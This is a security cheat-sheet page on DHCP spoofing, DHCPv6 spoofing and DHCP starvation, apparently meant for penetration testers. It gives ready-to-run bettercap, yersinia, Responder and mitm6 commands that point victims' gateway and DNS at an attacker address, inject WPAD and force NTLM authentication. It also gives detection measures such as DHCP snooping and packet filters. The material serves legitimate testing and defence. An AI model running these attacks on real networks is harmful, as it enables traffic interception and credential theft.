---
title: "DHCP"
---

# DHCP Spoofing

Rogue DHCP server that answers before the legitimate one to assign a malicious gateway or DNS server to victims. Useful to control network configuration from the moment a host joins the network, without waiting for ARP cache poisoning.

The typical DHCP handshake is: client broadcasts `DISCOVER`, server responds with `OFFER`, client broadcasts `REQUEST`, server acknowledges with `ACK` . An attacker who responds faster than the legitimate server can inject malicious parameters into the client's configuration .

## 🔴 Exploit

:::code-group

```bash [bettercap]
# Configuration
set dhcp.spoof.domains example.com
set dhcp.spoof.router $ATTACKER_IP # Force victims to use us as gateway
set dhcp.spoof.dns $ATTACKER_IP    # Force victims to use us as DNS
# set dhcp.spoof.wpad http://$ATTACKER_IP/wpad.dat  # WPAD injection
# set dhcp.spoof.lease_file /tmp/dhcp.leases
dhcp.spoof on
```

```bash [yersinia]
# apt install yersinia
yersinia dhcp -attack 1 -interface $interface
```

```bash [Responder]
# DHCP poisoning with WPAD injection
# Responder lets the real DHCP server assign IPs, but injects
# malicious WPAD/DNS parameters in the DHCP ACK with a 10s lease.
responder -I $interface -d -w -P

# Inject malicious DNS instead of WPAD
responder -I $interface -d -D -w -P

# Flags:
#   -d / --DHCP      : DHCP poisoning (WPAD injection by default)
#   -D / --DHCP-DNS  : inject malicious DNS server
#   -w / --wpad      : start rogue WPAD server
#   -P / --ProxyAuth : force NTLM auth after WPAD access
```

:::

### DHCPv6

:::code-group

```bash [bettercap]
# Configuration
set dhcp6.spoof.domains $DOMAIN_FQDN
set dhcp6.spoof.address $ATTACKER_IPv6
dhcp6.spoof on
```

```bash [mitm6]
# apt install mitm6
mitm6 -i $interface -d $DOMAIN_FQDN
```

:::

### DHCP Starvation

Exhaust the DHCP lease pool by flooding `DISCOVER` requests with spoofed MAC addresses. This is often a precursor to deploying a rogue DHCP server, as legitimate clients can no longer obtain an IP .

```bash
# Using Yersinia
yersinia dhcp -attack 2 -interface $interface

# Or with dhcpstarv (part of dsniff)
dhcpstarv -i $interface
```

## 🔵 Detection

::: details

### DHCP Snooping

Switch feature that classifies ports as trusted (connected to legitimate DHCP servers) or untrusted. DHCP messages from untrusted ports are filtered, preventing rogue servers from responding .

```bash
# Cisco switch configuration
ip dhcp snooping
ip dhcp snooping vlan <VLAN_ID>
interface <TRUSTED_PORT>
 ip dhcp snooping trust
```

### Wireshark / tshark Filters

```txt
bootp                        # All DHCP traffic
bootp.option.dhcp == 2       # DHCP OFFER
bootp.option.dhcp == 5       # DHCP ACK
bootp.option.router          # Router option (gateway)
bootp.option.dns             # DNS option
```

### CLI Detection

```bash
# Capture DHCP traffic
tcpdump -i eth0 -w dhcp_traffic.pcap "port 67 or port 68"

# Analyze with dhcpdump
dhcpdump -f dhcp_traffic.pcap

# Real-time
tcpdump -i eth0 "port 67 or port 68" | dhcpdump
```

Look for multiple `OFFER`/`ACK` messages for the same transaction, or unexpected router/DNS values .

### Starvation Detection

Monitor for a burst of `DISCOVER` messages with a high number of distinct client MAC addresses in a short window. Threshold-based detection (e.g., 75+ discovers with 50+ distinct MACs in one minute) can identify DHCP starvation attempts .

:::

## References

- [HackTricks - Pentesting Network](https://hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/index.html)
- [Bettercap dhcp.spoof](https://www.bettercap.org/modules/ethernet/spoofers/dhcp.spoof/)
- [Bettercap dhcp6.spoof](https://www.bettercap.org/modules/ethernet/spoofers/dhcp6.spoof/)
- [Responder DHCP Poisoner](https://github.com/lgandx/Responder)
- [Yersinia DHCP Attacks](https://github.com/tomac/yersinia)
- [Wireshark BOOTP/DHCP Filters](https://www.wireshark.org/docs/dfref/b/bootp.html)
